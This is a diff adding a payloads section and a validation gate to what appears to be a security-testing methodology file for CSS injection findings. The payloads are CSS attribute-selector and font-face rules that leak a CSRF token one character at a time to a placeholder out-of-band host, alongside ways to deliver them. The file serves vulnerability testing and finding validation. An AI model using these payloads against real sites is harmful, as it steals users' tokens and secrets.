@@ -47,6 +47,35 @@ feeds_into: [finding-validation, chain-custom]
 - Link to an HTML/XSS finding when both share one sink and one remediation; do not create two
   findings for the same root cause merely because CSS and JS impacts were both demonstrated.
 
+## Payloads
+
+```css
+/* Attribute exfiltration via selector + background fetch (token in DOM attr) */
+input[name="csrf"][value^="a"]{background:url(https://OAST/leak?c=a)}
+input[name="csrf"][value^="b"]{background:url(https://OAST/leak?c=b)}
+/* ...one rule per candidate char; widen prefix as each callback confirms. */
+
+/* Font-based / unicode-range exfiltration when url() is filtered */
+@font-face{font-family:x;src:url(https://OAST/f?c=a)}
+#secret{font-family:x}
+
+/* Layout/overflow oracle when no network sink is allowed: use
+   scrollbar or :has() width changes read out-of-band by the attacker page. */
+```
+
+Delivery: injected `style` attribute, `<style>` block, or a parameter reflected
+into a stylesheet. Confirm the sink reflects CSS (not HTML-encoded) first.
+
+## Validation Gate (minimum proof)
+
+- **Demonstrated:** an OAST callback whose query carries a real secret value
+  (CSRF token, session attribute) read from the victim DOM by the injected CSS,
+  correlated by unique token. Reflection of CSS alone is **Inferred**.
+- **Inferred:** attacker-controlled CSS provably reaches a rendered context
+  (style applied, verified in a real browser) but no value was exfiltrated.
+- Negative control: the same selector against a DOM without the secret must
+  NOT fire the callback.
+
 ## N/A and gotchas
 
 - Static CSS editing in your own developer tools is not injection.
